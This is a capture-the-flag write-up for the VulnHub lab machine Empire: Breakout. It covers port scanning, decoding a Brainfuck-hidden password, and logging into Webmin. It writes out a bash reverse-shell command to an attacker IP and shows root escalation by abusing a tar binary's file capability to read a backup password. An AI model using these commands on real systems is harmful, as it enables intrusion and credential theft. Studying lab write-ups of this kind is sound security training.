---
title: Empire:Breakout - Writeup
author: Elman Alizadeh
date: 2022-05-28 13:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, empire, breakout]
---

Today we will take a look at Vulnhub: Breakout. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes. [Link](https://www.vulnhub.com/entry/empire-breakout,751/)

![Desktop View]({{ "/assets/img/vuln-empire-breakout/1.jpeg" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC --open 192.168.0.109

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-server-header: MiniServ/1.981
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows
```

## Enum4linux

Command: enum4linux -a 192.168.0.109

We found a username here

![Desktop View]({{ "/assets/img/vuln-empire-breakout/2.png" | relative_url }})

## Web

If we look at the bottom of the page’s source code, we see a text encrypted by the brainfuck algorithm.

view-source:http://192.168.0.109/

```console
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```

[Splitbrain](https://www.splitbrain.org/_static/ook/)

If we decode, we get the password.

```console
.2uqPEfj3D<P'a-3
```

## Reverse Shell

When we look at port 20000, it redirects us to the admin panel with a link

https://192.168.0.109:20000/

```console
Username: cyber

Password: .2uqPEfj3D<P'a-3
```

Once logged in, there is a terminal icon on the bottom left. With its we can carry out orders. I’ll get a reverse shell.

```console
bash -i >& /dev/tcp/YourIP/1234 0>&1
```

![Desktop View]({{ "/assets/img/vuln-empire-breakout/3.png" | relative_url }})

## Root

Command: getcap -r / 2>/dev/null

```console
/home/cyber/tar cap_dac_read_search=ep
```

[NXNJZ](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)

```console
cyber@breakout:~$ ./tar -cvf old_pass /var/backups/.old_pass.bak

cyber@breakout:~$ ./tar -xvf old_pass

cyber@breakout:~$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h

cyber@breakout:~$ su root
```
![Desktop View]({{ "/assets/img/vuln-empire-breakout/4.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-empire-breakout/5.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”




